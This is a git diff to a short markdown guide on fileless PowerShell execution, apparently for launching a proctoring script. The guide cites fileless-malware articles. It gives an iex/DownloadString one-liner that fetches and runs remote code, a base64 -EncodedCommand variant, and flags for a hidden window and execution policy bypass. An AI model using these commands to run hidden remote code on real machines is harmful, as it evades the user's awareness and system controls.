@@ -12,7 +12,7 @@ Reference materials:
 - https://www.varonis.com/blog/fileless-malware
 - https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-
 
-## 1.1. Utilizing DownloadString and Invoke-Expression 
+## 1.1. Utilizing DownloadString and Invoke-Expression Parameters
 ```
 powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
 ```
@@ -21,7 +21,7 @@ This is possible because of two Powershell command
 - "DownloadString" where it does not download any file to disk but copies content of the remote file. 
 - "Invoke-Expression a.k.a iex" where it runs specified string as a command.
 
-## 1.2. Utilizing EncodedCommand
+## 1.2. Utilizing EncodedCommand Parameters
 To do this we must first, encode our script into base64 using the script below and taking note of the encoded string
 ```
 $command = '<the whole script>'
@@ -34,3 +34,8 @@ After we know the encoded string, runnning the command below will allow us to co
 powershell.exe -executionpolicy bypass -w hidden -e <base64encodedstring>
 ```
 The EncodedCommand a.k.a -e, will read the following given as a base64 string and proceed to execute it 
+
+## 1.3 Additional Parameters
+- WindowStyle (-w) hidden: This makes the Powershell operation stealth by hiding the program window away from the user
+- Exec Bypass: bypass/ignore the execution policy like _Restricted_ which restricts the PS command from running
+- Noprofile (-nop): Ignore the commands in the Profile file
